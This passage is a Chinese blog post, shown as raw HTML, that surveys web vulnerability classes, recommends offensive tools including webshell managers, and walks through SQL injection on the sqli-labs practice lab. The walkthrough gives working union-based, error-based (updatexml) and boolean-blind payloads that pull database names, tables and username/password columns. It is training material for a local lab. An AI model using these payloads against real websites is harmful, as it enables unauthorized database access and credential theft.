@@ -1,0 +1,3364 @@
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <meta name="description" content="这里是 @PurgationDevil 的个人博客，与你一起发现更大的世界">
+    <meta name="keywords" content="PurgationDevil Blog, 博客, 个人网站, 互联网, Web, 逆向, C语言数据结构">
+    <meta name="theme-color" content="#000000">
+
+    <!-- Open Graph -->
+    <meta property="og:title"
+        content="web漏洞攻击 - we1c0me t0 PurgationDevil 810g">
+    
+    <meta property="og:type" content="article">
+    <meta property="og:description" content="web漏洞攻击
+
+第一类——注入类：SQL 注入、命令注入、代码注入、LDAP 注入、XXE、模板注入
+
+第二类——跨端攻击类：反射型 XSS、存储型 XSS、DOM 型 XSS
+
+第三类——请求伪造类：CSRF、SSRF
+
+第四类——文件类：路径遍历、文件包含、文件上传
+
+第五类——反序列化类：PHP、Python、Java、JavaScript 等及其  JSON 库反序列化
+
+第六类—...">
+    
+    <meta property="article:published_time" content=" 2026-05-18T00:00:00Z">
+    
+    
+    
+    <meta property="article:tag" content="web">
+    
+    
+    <meta property="og:image" content="https://PurgationDevil.github.iohttps://github.com/PurgationDevil.png">
+    <meta property="og:url" content="https://PurgationDevil.github.io/%E5%88%86%E7%B1%BB%E5%90%8D%E7%A7%B0/2026/05/18/web%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/">
+    <meta property="og:site_name" content="we1c0me t0 PurgationDevil 810g">
+
+    <title>web漏洞攻击 - we1c0me t0 PurgationDevil 810g</title>
+
+    <!-- Web App Manifest -->
+    <link rel="manifest" href="/pwa/manifest.json">
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://PurgationDevil.github.io/%E5%88%86%E7%B1%BB%E5%90%8D%E7%A7%B0/2026/05/18/web%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href=" /css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href=" /css/hux-blog.min.css">
+
+    <!-- Custom Fonts -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- Navigation -->
+
+    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+        
+        <div class="container-fluid">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header page-scroll">
+                <button type="button" class="navbar-toggle">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="/">PurgationDevil Blog</a>
+            </div>
+
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div id="huxblog_navbar">
+                <div class="navbar-collapse">
+                    <ul class="nav navbar-nav navbar-right">
+                        <li><a href="/">首页</a></li>
+                        <li><a href="/about">关于</a></li>
+                        <li><a href="/archive">归档</a></li>
+                        <li class="search-icon">
+                            <a href="javascript:void(0)">
+                                <i class="fa-solid fa-search"></i>
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+
+    <script>
+        // Drop Bootstarp low-performance Navbar
+        // Use customize navbar with high-quality material design animation
+        // in high-perf jank-free CSS3 implementation
+        var $body = document.body;
+        var $toggle = document.querySelector('.navbar-toggle');
+        var $navbar = document.querySelector('#huxblog_navbar');
+        var $collapse = document.querySelector('.navbar-collapse');
+
+        var __HuxNav__ = {
+            close: function () {
+                $navbar.className = " ";
+                // wait until animation end.
+                setTimeout(function () {
+                    // prevent frequently toggle
+                    if ($navbar.className.indexOf('in') < 0) {
+                        $collapse.style.height = "0px"
+                    }
+                }, 400)
+            },
+            open: function () {
+                $collapse.style.height = "auto"
+                $navbar.className += " in";
+            }
+        }
+
+        // Bind Event
+        $toggle.addEventListener('click', function (e) {
+            if ($navbar.className.indexOf('in') > 0) {
+                __HuxNav__.close()
+            } else {
+                __HuxNav__.open()
+            }
+        })
+
+        /**
+         * Since Fastclick is used to delegate 'touchstart' globally
+         * to hack 300ms delay in iOS by performing a fake 'click',
+         * Using 'e.stopPropagation' to stop 'touchstart' event from 
+         * $toggle/$collapse will break global delegation.
+         * 
+         * Instead, we use a 'e.target' filter to prevent handler
+         * added to document close HuxNav.  
+         *
+         * Also, we use 'click' instead of 'touchstart' as compromise
+         */
+        document.addEventListener('click', function (e) {
+            if (e.target == $toggle) return;
+            if (e.target.className == 'icon-bar') return;
+            __HuxNav__.close();
+        })
+    </script>
+
+<!-- Search -->
+<div class="search-page">
+  <div class="search-icon-close-container">
+    <span class="search-icon-close">
+      <i class="fa-solid fa-chevron-down"></i>
+    </span>
+  </div>
+  <div class="search-main container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <form></form>
+        <input type="text" id="search-input" placeholder="$ grep...">
+        </form>
+        <div id="search-results" class="mini-post-list"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div id="main-content">
+    <!-- Mermaid 支持 -->
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: 'default'
+    });
+    mermaid.init(undefined, document.querySelectorAll('.language-mermaid'));
+  });
+</script>
+
+<!-- 固定目录（跟随滚动） - PC端 -->
+<style>
+.toc-fixed {
+  position: fixed;
+  right: 20px;
+  top: 40%;
+  transform: translateY(-50%);
+  width: 200px;
+  max-height: 60vh;
+  background: rgba(255, 255, 255, 0.95);
+  backdrop-filter: blur(10px);
+  border-radius: 12px;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+  padding: 16px;
+  overflow-y: auto;
+  z-index: 999;
+  border: 1px solid #eaeaea;
+}
+
+.toc-fixed h4 {
+  margin: 0 0 12px 0;
+  font-size: 14px;
+  font-weight: 600;
+  color: #333;
+  padding-bottom: 8px;
+  border-bottom: 2px solid #0085a1;
+}
+
+.toc-fixed ul {
+  list-style: none;
+  padding-left: 0;
+  margin: 0;
+}
+
+.toc-fixed li {
+  margin: 8px 0;
+}
+
+.toc-fixed a {
+  color: #555;
+  text-decoration: none;
+  font-size: 13px;
+  display: block;
+  transition: all 0.2s;
+}
+
+.toc-fixed a:hover {
+  color: #0085a1;
+  transform: translateX(2px);
+}
+
+.toc-fixed a.active {
+  color: #0085a1;
+  font-weight: 500;
+  border-left: 2px solid #0085a1;
+  padding-left: 8px;
+}
+
+/* 滚动条 */
+.toc-fixed::-webkit-scrollbar {
+  width: 4px;
+}
+
+.toc-fixed::-webkit-scrollbar-track {
+  background: #f1f1f1;
+  border-radius: 4px;
+}
+
+.toc-fixed::-webkit-scrollbar-thumb {
+  background: #ccc;
+  border-radius: 4px;
+}
+
+/* 手机端隐藏PC目录 */
+@media (max-width: 992px) {
+  .toc-fixed {
+    display: none;
+  }
+}
+
+@media (prefers-color-scheme: dark) {
+  .toc-fixed {
+    background: rgba(10, 20, 30, 0.95);
+    border: 1px solid #2a3f5f;
+  }
+  
+  .toc-fixed h4 {
+    color: #ffffff;
+    border-bottom-color: #00d4ff;
+  }
+  
+  .toc-fixed a {
+    color: #d4d4d4;
+  }
+  
+  .toc-fixed a:hover {
+    color: #00d4ff;
+  }
+  
+  .toc-fixed a.active {
+    color: #00d4ff;
+    border-left-color: #00d4ff;
+  }
+  
+  .toc-fixed::-webkit-scrollbar-track {
+    background: #1a2735;
+  }
+  
+  .toc-fixed::-webkit-scrollbar-thumb {
+    background: #3a5065;
+  }
+}
+</style>
+
+<script>
+(function() {
+  function initToc() {
+    var article = document.querySelector('.post-container');
+    if (!article) return;
+    
+    var headers = article.querySelectorAll('h2, h3');
+    if (headers.length === 0) return;
+    
+    // 创建PC端目录
+    var tocDiv = document.createElement('div');
+    tocDiv.className = 'toc-fixed';
+    tocDiv.innerHTML = '<h4>📖 目录</h4><ul></ul>';
+    var tocList = tocDiv.querySelector('ul');
+    
+    headers.forEach(function(header, index) {
+      var id = 'toc-' + index;
+      header.id = id;
+      
+      // PC端目录项
+      var li = document.createElement('li');
+      var a = document.createElement('a');
+      a.href = '#' + id;
+      a.textContent = header.textContent;
+      a.addEventListener('click', function(e) {
+        e.preventDefault();
+        document.getElementById(id).scrollIntoView({ behavior: 'smooth', block: 'start' });
+      });
+      li.appendChild(a);
+      tocList.appendChild(li);
+    });
+    
+    document.body.appendChild(tocDiv);
+    
+    // 高亮当前章节
+    var tocLinks = document.querySelectorAll('.toc-fixed a');
+    window.addEventListener('scroll', function() {
+      var scrollPos = window.scrollY + 100;
+      var currentId = null;
+      
+      headers.forEach(function(header) {
+        var offsetTop = header.offsetTop;
+        if (offsetTop <= scrollPos) {
+          currentId = header.id;
+        }
+      });
+      
+      tocLinks.forEach(function(link) {
+        link.classList.remove('active');
+        var href = link.getAttribute('href').substring(1);
+        if (href === currentId) {
+          link.classList.add('active');
+        }
+      });
+    });
+  }
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initToc);
+  } else {
+    initToc();
+  }
+})();
+</script>
+
+<!-- Image to hack wechat -->
+<!-- <img src="/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="/img/home-bg.jpg" width="0" height="0"> -->
+
+<!-- Post Header -->
+
+
+
+<style type="text/css">
+    header.intro-header{
+        position: relative;
+        background-image: url('/img/home-bg.jpg');
+        background: ;
+    }
+
+    
+</style>
+
+
+
+
+<header class="intro-header" >
+
+    <div class="header-mask"></div>
+    
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/archive/?tag=web" title="web">web</a>
+                        
+                    </div>
+                    <h1>web漏洞攻击</h1>
+                    
+                    <h2 class="subheading"></h2>
+                    <span class="meta">Posted by PurgationDevil Blog on May 18, 2026</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+
+
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <!-- Multi-Lingual -->
+                
+
+				<h1 id="web漏洞攻击">web漏洞攻击</h1>
+
+<p>第一类——注入类：SQL 注入、命令注入、代码注入、LDAP 注入、XXE、模板注入</p>
+
+<p>第二类——跨端攻击类：反射型 XSS、存储型 XSS、DOM 型 XSS</p>
+
+<p>第三类——请求伪造类：CSRF、SSRF</p>
+
+<p>第四类——文件类：路径遍历、文件包含、文件上传</p>
+
+<p>第五类——反序列化类：PHP、Python、Java、JavaScript 等及其  JSON 库反序列化</p>
+
+<p>第六类——配置与逻辑类：信息泄露、越权、会话固定、CORS 配置错误</p>
+
+<hr />
+
+<p>常见工具吐槽一栏：</p>
+
+<p><strong>核心工具（必装❗）</strong></p>
+
+<ul>
+  <li><strong>Burp Suite Professional</strong>：Web 安全测试的超级武器，几乎什么漏洞都能探测到。但是一定要 Pro 版，否则去用 Yakit。</li>
+  <li><strong>Yakit</strong>：国产免费的小钢炮，是 Burp Suite Pro 的最强平替，轻量快速，上手飞快，适合日常测试和学习。</li>
+</ul>
+
+<p>信息收集</p>
+
+<ul>
+  <li><strong>Nmap</strong>：信息收集界永远的神，一句 <code class="language-plaintext highlighter-rouge">-sV</code> 就能把目标裤衩都扫出来。</li>
+</ul>
+
+<p>注入类</p>
+
+<ul>
+  <li><strong>sqlmap</strong>：SQL 注入的核弹级工具，是“一键爆库神器”。</li>
+  <li><strong>Commix</strong>：命令注入界的 sqlmap，能让远程执行命令如探囊取物。</li>
+  <li><strong>Tplmap</strong>：专治各种花里胡哨模板引擎。</li>
+  <li><strong>XXEinjector</strong>：XXE 漏洞利器，看起来像读 XML，实际上是在偷服务器家底。</li>
+  <li><strong>Mustache Exploit Toolkit</strong>：模板注入利器，让你在前端模板中玩“魔法”，执行任意代码。</li>
+</ul>
+
+<p>跨端攻击类</p>
+
+<ul>
+  <li><strong>XSStrike</strong>：专门钻前端过滤器空子。</li>
+  <li><strong>DalFox</strong>：DOM 型 XSS 的探索者，专门追踪 JS 执行路径，让页面“裸奔”显现漏洞。</li>
+  <li><strong>DOM Invader</strong>：专门扒开浏览器前端逻辑，看 DOM XSS 藏哪儿了</li>
+</ul>
+
+<p>请求伪造类</p>
+
+<ul>
+  <li><strong>SSRFmap</strong>：擅长把请求“反弹”到内网，让你窥探不该看的东西。</li>
+</ul>
+
+<p>文件类</p>
+
+<ul>
+  <li><strong>China Chopper（菜刀）</strong>：一句话木马鼻祖，体积小得像根针，危险程度像颗雷。</li>
+  <li><strong>AntSword（蚁剑）</strong>：简洁，中国菜刀续作，国内 WebShell 管理基本人手一个。</li>
+  <li><strong>Godzilla（哥斯拉特战版）</strong>：猛，内存马时代的“重装特战队”，隐蔽、插件多、后渗透能力猛。</li>
+  <li><strong>Dirsearch</strong>：目录扫描界的“老黄牛”，不花哨但特别能翻后台。</li>
+  <li><strong>wfuzz</strong>：字典一挂，目录和参数全给你“地毯式轰炸”。</li>
+  <li><strong>ffuf</strong>：速度快得像在拿机枪扫网站目录。</li>
+  <li><strong>DotDotPwn</strong>：路径遍历的老牌神兵，帮你找到“上天入地”的文件漏洞。</li>
+  <li><strong>Fimap</strong>：文件包含的侦察兵，专门扫描 LFI/RFI，让文件“乖乖现形”。</li>
+  <li><strong>Commix &amp; Burp Intruder</strong>：配合文件上传漏洞，轻松试探上传点，找到“后门入口”。</li>
+</ul>
+
+<p>反序列化类</p>
+
+<ul>
+  <li><strong>ysoserial</strong>：Java 反序列化神器，序列化和反序列化间的“隐形通道”完全掌握。</li>
+  <li><strong>PHPGGC</strong>：PHP 反序列化的魔法书，生成 payload，远程代码执行手到擒来。</li>
+  <li><strong>pickletools / python-ysoserial</strong>：Python 反序列化探索者，帮你解析 pickle 的秘密。</li>
+</ul>
+
+<p>配置与逻辑类</p>
+
+<ul>
+  <li><strong>Nmap + Nikto</strong>：服务器配置扫描组合拳，找错端口、过期服务、弱口令配置。</li>
+  <li><strong>JWT_tool / CORS Exploiter</strong>：专攻身份和跨域逻辑漏洞，让你轻松验证会话和权限问题。</li>
+</ul>
+
+<p>其他大型工具</p>
+
+<ul>
+  <li>Metasploit：太重，容易变“脚本小子启动器”。</li>
+  <li>AWVS：容易把人扫废了，自己却不知道漏洞原理。</li>
+  <li>Nessus：偏运维和内网，不是 Web 主战场。</li>
+  <li>Kali 全家桶：90% 工具你一年都不会点开一次。</li>
+</ul>
+
+<hr />
+
+<p>推荐配置：</p>
+
+<p><strong>浏览器</strong></p>
+
+<p>首选Google Chrome（谷歌），其次是Firefox Developer Edition（火狐），最后是Microsoft Edge。</p>
+
+<p><strong>抓包</strong></p>
+
+<p>Burp Suite Professional（Yakit）（下方是Burp插件）</p>
+<ul>
+  <li>Autorize：越权测试自动化，换 Cookie 就像换身份证。</li>
+  <li>JSON Web Tokens：JWT 一测一个不吱声。</li>
+  <li>Hackvertor：编码绕 WAF 时像在开作弊器。</li>
+  <li>Turbo Intruder：爆破速度快得像火神加特林。</li>
+  <li>DOM Invader：DOM XSS 的“透视眼”。</li>
+  <li>Logger++：请求一多，全靠它帮你捞关键包。</li>
+</ul>
+
+<p><strong>信息收集</strong>：Nmap</p>
+
+<p><strong>目录 / 文件</strong>：Dirsearch</p>
+
+<p><strong>注入</strong>：sqlmap、Commix（选装）</p>
+
+<p><strong>XSS</strong>：XSStrike（选装）</p>
+
+<p><strong>反序列化类</strong>：ysoserial（选装）、PHPGGC（选装）</p>
+
+<p><strong>WebShell 管理</strong>：AntSword、Godzilla</p>
+
+<hr />
+
+<h2 id="第一类注入类">第一类：注入类</h2>
+
+<h3 id="11-sql-注入">1.1 SQL 注入</h3>
+
+<h4 id="sql注入基本顺序">SQL注入基本顺序</h4>
+
+<p>配合靶场：sqli-labs（该靶场重复性太高，这里只挑类型展开）</p>
+
+<p>相关工具：sqlmap（盲注利器）、burpsuite（某些场景，如HTTP头注入）</p>
+
+<p><strong>首先是信息收集。哪里可以注入。</strong></p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">输入点类型</th>
+      <th style="text-align: left">示例</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">GET参数</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">?id=1</code>、<code class="language-plaintext highlighter-rouge">?page=2</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">POST参数</td>
+      <td style="text-align: left">表单提交、JSON数据</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Cookie</td>
+      <td style="text-align: left">存储的用户标识、筛选条件</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">HTTP头</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">User-Agent</code>、<code class="language-plaintext highlighter-rouge">X-Forwarded-For</code>、<code class="language-plaintext highlighter-rouge">Referer</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">文件名/路径</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">?file=about.php</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>然后再手工探测。</strong></p>
+
+<p>不急着构造完整payload，先确认这个点”对特殊字符有反应”。进行单引号测试。</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">响应特征</th>
+      <th style="text-align: left">判断</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">数据库报错（<code class="language-plaintext highlighter-rouge">You have an error in your SQL syntax</code>）</td>
+      <td style="text-align: left">✅ 很可能存在注入</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">页面空白/内容缺失</td>
+      <td style="text-align: left">✅ 可能触发错误但没开报错</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">页面正常，无任何变化</td>
+      <td style="text-align: left">❌ 可能安全，也可能是盲注（需进一步测）</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">返回WAF拦截页面</td>
+      <td style="text-align: left">⚠️ 存在防护，需绕过</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>1. 首先尝试联合注入和报错注入。</p>
+
+<p><em>有回显位置 → 联合注入；开报错 → 报错注入。</em></p>
+
+<p>2. 如果上两种不行则尝试数字型注入、宽字节注入和堆叠注入。</p>
+
+<p><em>有回显位置但不能加闭合 → 数字型注入；存在 GBK 编码且单引号被转义 → 宽字节注入；支持多语句执行 → 堆叠注入</em></p>
+
+<p>3. 最后以上都不行再用布尔盲注和时间盲注。</p>
+
+<p><em>有明显报错但是没有报错信息 → 布尔盲注；没有任何回显信息但是是SQL注入 → 时间盲注。</em></p>
+
+<p>4. 如果 时间盲注 + 所有想到的绕过方式 都没有办法就说明sql被人写死了，只能找其他漏洞了。</p>
+
+<h4 id="sqli-labs-less-1--联合注入">sqli-labs Less-1 – 联合注入</h4>
+
+<p><strong>步骤1：找注入点</strong></p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>http://localhost/sqli-labs/Less-1/?id=1  → 有回显位置
+http://localhost/sqli-labs/Less-1/?id=1' → 有页面报错信息
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>可以联合注入或报错注入。</p>
+
+<p><strong>常见闭合方式</strong></p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">闭合类型</th>
+      <th style="text-align: left">代码示例</th>
+      <th style="text-align: left">注入时需输入</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">数字型</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">WHERE id = $id</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">1 OR 1=1</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">单引号</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">WHERE id = '$id'</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">1' OR '1'='1</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">双引号</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">WHERE id = "$id"</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">1" OR "1"="1</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">括号</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">WHERE id = ($id)</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">1) OR (1=1</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">混合</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">WHERE id = ('$id')</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">1') OR ('1'='1</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Less-1、Less-2、Less-3、Less-4皆为重复题，可以练习闭合。</p>
+
+<p><strong>步骤2：确认注入方式，开始注入</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">ORDER BY</code> 判断列数，然后 <code class="language-plaintext highlighter-rouge">UNION SELECT</code> 在回显位置查询。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre><span class="c1">-- 逐次增加列数，直到报错（--+ 和 # 是注释掉后面的闭合）</span>
+<span class="mi">1</span><span class="s1">' order by 1 --+
+1'</span> <span class="k">order</span> <span class="k">by</span> <span class="mi">2</span> <span class="c1">--+</span>
+<span class="mi">1</span><span class="s1">' order by 3 --+
+
+-- 假设列数为 3
+-1'</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span> <span class="c1">--+</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>页面显示的位置（如 2、3）就是可以注入的位置。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre><span class="c1">-- 数据库名（和sql库版本）</span>
+<span class="o">-</span><span class="mi">1</span><span class="s1">' union select 1,database(),version()--+
+
+-- 表名
+-1'</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="k">table_name</span><span class="p">,</span><span class="mi">3</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">WHERE</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">'数据库名'</span> <span class="c1">--+</span>
+
+<span class="c1">-- 列名</span>
+<span class="o">-</span><span class="mi">1</span><span class="s1">' union select 1,column_name,3 FROM information_schema.columns WHERE table_name='</span><span class="err">表名</span><span class="s1">' --+
+
+-- 数据
+-1'</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="n">password</span> <span class="k">FROM</span> <span class="err">表名</span> <span class="c1">--+</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h4 id="sqli-labs-less-5--报错注入">sqli-labs Less-5 – 报错注入</h4>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>http://localhost/sqli-labs/Less-1/?id=5  → 无回显位置
+http://localhost/sqli-labs/Less-1/?id=5' → 有页面报错信息
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>不能选择联合注入，但是可以选择报错注入。（<strong>长度限制</strong>：报错只显示32位，超长要用<code class="language-plaintext highlighter-rouge">substr()</code>分段）</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre><span class="c1">-- 数据库名</span>
+<span class="mi">1</span><span class="s1">' and updatexml(1,concat(0x7e,database()),1)--+
+
+-- 表名
+1'</span> <span class="k">and</span> <span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">'数据库名'</span><span class="p">)),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+</span>
+
+<span class="c1">-- 列名</span>
+<span class="mi">1</span><span class="s1">' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span><span class="err">表名</span><span class="s1">')),1)--+
+
+-- 数据
+1'</span> <span class="k">and</span> <span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="n">concat</span><span class="p">(</span><span class="err">列名</span><span class="p">,</span><span class="s1">':'</span><span class="p">,</span><span class="err">列名</span><span class="p">)</span> <span class="k">from</span> <span class="n">users</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h4 id="sqli-labs-less-7--布尔盲注">sqli-labs Less-7 – 布尔盲注</h4>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>http://localhost/sqli-labs/Less-1/?id=7    → 无回显位置
+http://localhost/sqli-labs/Less-1/?id=7')) → 有页面报错
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>无回显位置，无页面报错信息，也无任何特征。盲注无疑了，但是有页面报错，那就是布尔盲注。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre></td><td class="rouge-code"><pre><span class="c1">-- 先看数据库长度</span>
+<span class="mi">1</span><span class="s1">')) and length(database())=8--+
+
+-- 挨个字母猜数据库名（security）
+1'</span><span class="p">))</span> <span class="k">and</span> <span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">115</span><span class="c1">--+ 第一个字母是s</span>
+<span class="mi">1</span><span class="s1">')) and ascii(substr(database(),2,1))=101--+ 第二个字母是e
+-- ...
+
+-- 获取表数量（4个）
+1'</span><span class="p">))</span> <span class="k">and</span> <span class="p">(</span><span class="k">select</span> <span class="k">count</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">'数据库名'</span><span class="p">)</span><span class="o">=</span><span class="mi">4</span><span class="c1">--+</span>
+
+<span class="c1">-- 获取表名长度</span>
+<span class="mi">1</span><span class="s1">')) and length(select table_name from information_schema.tables where table_schema='</span><span class="err">数据库名</span><span class="s1">' limit 0,1)=4--+
+
+-- 获取表名（猜）（emails,referers,uagents,users）
+1'</span><span class="p">))</span> <span class="k">and</span> <span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">'数据库名'</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">101</span><span class="c1">--+</span>
+
+<span class="c1">-- 获取字段个数（3字段）</span>
+<span class="mi">1</span><span class="s1">')) and (select count(column_name) from information_schema.columns where table_name='</span><span class="n">users</span><span class="s1">')=3 --+
+
+-- 获取字段名（最后是id,username,password）
